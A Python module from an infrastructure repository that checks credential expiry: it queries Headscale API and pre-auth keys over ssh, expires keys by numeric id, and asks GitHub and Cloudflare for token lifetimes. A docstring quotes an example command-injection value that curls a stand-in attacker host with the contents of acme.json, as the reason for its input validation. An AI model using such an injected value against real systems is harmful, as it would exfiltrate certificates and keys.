"""When does each credential stop working, and who would notice.

`SECRET_CATALOG` records how to rotate every secret and nothing records when any
of them dies. That asymmetry is the gap this closes: rotation is a procedure
someone follows deliberately, expiry is a date that arrives whether or not
anyone is looking.

The failure it prevents is dated and specific. `aws.headscale_api_key` expires
2027-03-27. `aws1` is a Spot instance: if it is replaced after that date, its
cloud-init cannot clean up the stale Headscale node or register the new one, so
the replacement lands as `aws1-<random>` and breaks the inventory, the
kubeconfig and the prod EndpointSlice. Nothing fails loudly -- the hub simply
does not come back, months after anyone last thought about a key.

ASKED, NOT REMEMBERED. Expiry is read from the issuing service, never from a
date recorded here. A recorded date is a second declaration that drifts the
moment a key is re-minted, and it drifts silently in the safe-looking direction:
it keeps saying "fine" about a key that was replaced with a shorter-lived one.
This repository has that failure written down three times over; a date in a
config file would be the fourth.
"""

from __future__ import annotations

import re
import subprocess
from dataclasses import dataclass
from datetime import datetime, timezone
from enum import Enum


class Expiry(str, Enum):
    """How a secret's lifetime is determined."""

    # Cannot expire by construction: we generate it, nothing issues it, and no
    # remote service will stop honouring it. Random tokens, argon2 hashes, RSA
    # keys, passwords.
    NEVER = "never"
    # Issued by a service that knows the expiry and can be asked. The only kind
    # this module can check, and the only kind where "unknown" is a real risk.
    PROVIDER = "provider"
    # Not yet assessed. The default deliberately: a new catalog entry should
    # show up as unclassified rather than quietly assumed immortal.
    UNKNOWN = "unknown"


@dataclass(frozen=True)
class KeyExpiry:
    prefix: str
    expires_at: datetime
    created_at: datetime | None = None

    @property
    def days_left(self) -> int:
        return (self.expires_at - datetime.now(timezone.utc)).days


class ExpiryUnavailableError(RuntimeError):
    """The issuing service could not be asked.

    Deliberately distinct from "nothing expires soon". A check that cannot run
    must never report success -- the same rule `argo check-drift` follows with
    its exit code 2.
    """


# `headscale apikeys list` renders a table with ANSI colour. Parsed by column
# rather than by scraping the whole line: the Prefix field is deliberately
# truncated by headscale itself (`hskey-api-xxxx-***`), so no usable key
# material can appear here even if the output format changes.
_ROW = re.compile(
    r"^\s*(?P<id>\d+)\s*\|\s*(?P<prefix>\S+)\s*\|\s*(?P<expires>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})"
    r"\s*\|\s*(?P<created>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})"
)


# Docker container names: what the daemon itself accepts, no wider.
_SAFE_CONTAINER = re.compile(r"[A-Za-z0-9][A-Za-z0-9_.-]*")


def _strip_ansi(text: str) -> str:
    return re.sub(r"\x1b\[[0-9;]*m", "", text)


def parse_headscale_apikeys(output: str) -> list[KeyExpiry]:
    """Rows from `headscale apikeys list`, ANSI stripped."""
    keys: list[KeyExpiry] = []
    for line in _strip_ansi(output).splitlines():
        m = _ROW.match(line)
        if not m:
            continue
        keys.append(
            KeyExpiry(
                prefix=m.group("prefix"),
                expires_at=datetime.strptime(m.group("expires"), "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc),
                created_at=datetime.strptime(m.group("created"), "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc),
            )
        )
    return keys


def headscale_apikeys(ssh_target: str, container: str = "headscale") -> list[KeyExpiry]:
    """Ask the VPS what it will still accept, and when it will stop.

    Raises rather than returning an empty list when the host cannot be reached:
    an unreachable Headscale and a Headscale with no keys are indistinguishable
    from an empty result, and only one of them is safe to ignore.
    """
    result = subprocess.run(
        [
            "ssh",
            "-o",
            "ConnectTimeout=10",
            "-o",
            "BatchMode=yes",
            ssh_target,
            f"docker exec {container} headscale apikeys list",
        ],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        raise ExpiryUnavailableError(f"could not ask headscale on {ssh_target}: {result.stderr.strip()}")

    keys = parse_headscale_apikeys(result.stdout)
    if not keys:
        raise ExpiryUnavailableError(
            f"headscale on {ssh_target} reported no API keys. Every hub reads one at boot, "
            "so an empty list means the query failed, not that none are needed."
        )
    return keys


@dataclass(frozen=True)
class PreAuthKey:
    """A tailnet admission ticket, which is a different thing from an API key.

    An API key administers Headscale. A pre-auth key does exactly one thing:
    register a machine into the mesh. In this fleet the mesh IS the perimeter --
    staging is VPN-only and there is no second gate behind it -- so a `reusable`
    key that has not expired is a standing invitation for as long as it lives.
    """

    key_id: str
    prefix: str
    reusable: bool
    used: bool
    expires_at: datetime
    owner: str

    @property
    def is_live(self) -> bool:
        return self.expires_at > datetime.now(timezone.utc)

    @property
    def risk(self) -> str:
        """Why this one matters, in the operator's terms rather than a boolean."""
        if not self.is_live:
            return "expired"
        if self.reusable and not self.used:
            return "REUSABLE, unused — admits any number of machines until it expires"
        if self.reusable:
            return "reusable — still admits more machines"
        return "single-use"


# `headscale preauthkeys list` is a wider table than the apikeys one and the
# column order differs, so it gets its own pattern rather than a shared, laxer
# one that would silently match the wrong field.
_PREAUTH_ROW = re.compile(
    r"^\s*(?P<id>\d+)\s*\|\s*(?P<prefix>\S+)\s*\|\s*(?P<reusable>true|false)"
    r"\s*\|\s*(?P<ephemeral>true|false)\s*\|\s*(?P<used>true|false)"
    r"\s*\|\s*(?P<expires>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})"
    r"\s*\|\s*(?P<created>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})"
    r"\s*\|\s*(?P<owner>\S+)"
)


def parse_headscale_preauthkeys(output: str) -> list[PreAuthKey]:
    """Rows from `headscale preauthkeys list`, ANSI stripped."""
    keys: list[PreAuthKey] = []
    for line in _strip_ansi(output).splitlines():
        m = _PREAUTH_ROW.match(line)
        if not m:
            continue
        keys.append(
            PreAuthKey(
                key_id=m.group("id"),
                prefix=m.group("prefix"),
                reusable=m.group("reusable") == "true",
                used=m.group("used") == "true",
                expires_at=datetime.strptime(m.group("expires"), "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc),
                owner=m.group("owner"),
            )
        )
    return keys


def headscale_preauthkeys(ssh_target: str, container: str = "headscale") -> list[PreAuthKey]:
    """Ask the VPS which machines it would still admit.

    Unlike `headscale_apikeys`, an empty list here is a legitimate answer: a fleet
    can genuinely hold no pre-auth keys, and the GCP hub's design goal is exactly
    that -- it mints a single-use key at boot instead of storing one. So this
    raises only when the host could not be asked, never on emptiness.

    `check-expiry` does not cover these. That gap is why three reusable keys sat
    live and unnoticed until 2026-08-23: absence from a report nobody wrote is
    not evidence of absence.
    """
    result = subprocess.run(
        [
            "ssh",
            "-o",
            "ConnectTimeout=10",
            "-o",
            "BatchMode=yes",
            ssh_target,
            f"docker exec {container} headscale preauthkeys list",
        ],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        raise ExpiryUnavailableError(f"could not ask headscale on {ssh_target}: {result.stderr.strip()}")
    return parse_headscale_preauthkeys(result.stdout)


def expire_headscale_preauthkey(ssh_target: str, key_id: str, container: str = "headscale") -> None:
    """Expire one pre-auth key by id. Raises if the command did not succeed.

    Never expires by prefix: headscale truncates prefixes in its own output
    (`hskey-auth-xxxx-***`), so a prefix is a display string and matching on one
    risks acting on the wrong key -- or on none, silently.

    `--force` is required, not defensive. Without it headscale prompts for
    confirmation, and under `BatchMode=yes` there is no terminal to answer, so the
    command would hang or abort depending on the ssh buffer -- a failure that
    looks like a network problem and is not. Flags verified against the running
    v0.28 binary rather than assumed: it is `--id`, not `--identifier`.

    Both arguments are validated at this boundary rather than at the caller.
    Raised in review of #1353: the CLI path is safe because it matches `key_id`
    against ids it parsed from headscale's own output, but this function is
    importable and the argument is interpolated into a string that a remote shell
    executes. A caller passing `"20; curl attacker/?k=$(cat /data/acme.json)"`
    would get arbitrary execution on the VPS. `headscale_apikeys` shares the
    pattern, but this one MUTATES, so the blast radius is larger and the guard
    belongs where the string is built, not where today's only caller happens to
    be careful.

    A `raise`, not an `assert`: assertions vanish under `python -O`, and a guard
    that an interpreter flag can switch off is not a guard.
    """
    if not key_id.isdigit():
        raise ValueError(f"pre-auth key id must be numeric, got {key_id!r}")
    if not _SAFE_CONTAINER.fullmatch(container):
        raise ValueError(f"unsafe container name {container!r}")

    result = subprocess.run(
        [
            "ssh",
            "-o",
            "ConnectTimeout=10",
            "-o",
            "BatchMode=yes",
            ssh_target,
            f"docker exec {container} headscale preauthkeys expire --force --id {key_id}",
        ],
        capture_output=True,
        text=True,
    )
    if result.returncode != 0:
        raise ExpiryUnavailableError(f"could not expire pre-auth key {key_id}: {result.stderr.strip()}")


def resolve_expiry(spec: object) -> Expiry:
    """A secret's expiry policy, with the rule applied rather than repeated.

    THE RULE: if this repository generates the value, nothing can revoke it on a
    schedule -- random tokens, argon2 hashes, RSA keys, passwords we chose. Those
    are `NEVER` by construction, and writing `expiry=Expiry.NEVER` on 38 catalog
    entries would be the same fact declared 38 times, free to disagree with the
    `kind` beside it.

    Only EXTERNAL secrets -- issued by somebody else -- can expire, so those are
    the only ones a human has to classify. An unclassified EXTERNAL secret stays
    `UNKNOWN`, which is the honest answer and the one that shows up in a report.
    """
    declared = getattr(spec, "expiry", Expiry.UNKNOWN)
    if declared is not Expiry.UNKNOWN:
        return declared
    kind = getattr(getattr(spec, "kind", None), "value", None)
    return Expiry.UNKNOWN if kind == "external" else Expiry.NEVER


# --- Providers that can be asked ------------------------------------------
#
# One function per issuer, each returning the expiry it reports or None when the
# credential genuinely has none. The credential is USED, never printed: asking
# the issuer proves the value works and reveals its lifetime in one call, which
# is the same "verify by consequence" rule the transcript doctrine states for
# credentials generally.


def github_pat_expiry(token: str, timeout: float = 15.0) -> datetime | None:
    """Expiry of a GitHub PAT, from the header GitHub returns on any call.

    None means a classic token with no expiry set -- valid forever until
    revoked, which is its own risk but not this check's.
    """
    import urllib.request

    req = urllib.request.Request(
        "https://api.github.com/user",
        headers={"Authorization": f"Bearer {token}", "Accept": "application/vnd.github+json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.headers.get("github-authentication-token-expiration")
    except Exception as exc:  # noqa: BLE001 - any failure here is "cannot check"
        raise ExpiryUnavailableError(f"GitHub rejected or could not be reached: {exc}") from exc

    if not raw:
        return None
    # "2026-09-14 23:52:41 UTC"
    return datetime.strptime(raw.replace(" UTC", ""), "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)


def cloudflare_token_expiry(token: str, timeout: float = 15.0) -> datetime | None:
    """Expiry of a Cloudflare API token, from its own verify endpoint."""
    import json
    import urllib.request

    req = urllib.request.Request(
        "https://api.cloudflare.com/client/v4/user/tokens/verify",
        headers={"Authorization": f"Bearer {token}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = json.loads(resp.read().decode())
    except Exception as exc:  # noqa: BLE001
        raise ExpiryUnavailableError(f"Cloudflare rejected or could not be reached: {exc}") from exc

    raw = (body.get("result") or {}).get("expires_on")
    if not raw:
        return None
    return datetime.fromisoformat(raw.replace("Z", "+00:00"))


# key_path -> the function that asks its issuer. A secret marked PROVIDER with no
# entry here is a gap the report names rather than skips: "we said this expires
# and we cannot find out when" is a finding, not a blank line.
PROVIDER_CHECKS = {
    "cloudflare.api_token": cloudflare_token_expiry,
    "apps.services.automation.github_runner.token": github_pat_expiry,
    "apps.services.automation.dev_node.github_token": github_pat_expiry,
}
